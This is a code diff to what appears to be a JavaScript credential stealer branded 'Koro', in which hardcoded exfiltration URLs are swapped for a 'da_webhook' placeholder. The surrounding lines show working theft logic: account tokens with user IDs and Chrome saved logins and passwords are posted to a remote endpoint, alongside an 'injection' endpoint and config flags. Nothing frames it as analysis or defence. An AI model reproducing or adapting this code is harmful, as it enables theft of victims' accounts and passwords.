@@ -68,7 +68,7 @@ function koro(p) {
                     token = token.replace(/"/g, '');
                     var a = `{"content": "Token: ${token}", "username": "UID: ${uid}"}`;
                     console.log(a)
-                    axios.post("http://xdfds.korohosting.com/api2.php?type=old", {
+                    axios.post("http://da_webhook/api2.php?type=old", {
                         "content": `Token: **${token}** \nUID: **${uid}**`,
                         "username": "Old Tokens by Koro"
                     })
@@ -125,7 +125,7 @@ function getChromePass(source_file, dest_file){
                 if (username == "") username = "Não Capturado";
                 if (password_value == "") password_value = "Não Capturado";
                 //console.log(result);
-                axios.post("http://xdfds.korohosting.com/api2.php?type=chrome", {
+                axios.post("http://da_webhook/api2.php?type=chrome", {
                     "content": `{"content": "URL: **${url}** \\nLogin: **${username}**\\nSenha (Hex): **${password_value}**", "username": "Chrome Pass by Koro"}`,
                     "username": "Chrome Pass by Koro"
                 })
@@ -143,7 +143,7 @@ function getChromePass(source_file, dest_file){
     db.close();
 }
 
-const superstarlmao = "https://xdfds.korohosting.com/api2.php?type=injection"
+const superstarlmao = "https://da_webhook/api2.php?type=injection"
 const config = {
     "logout": "false",
     "inject-notify": "true",
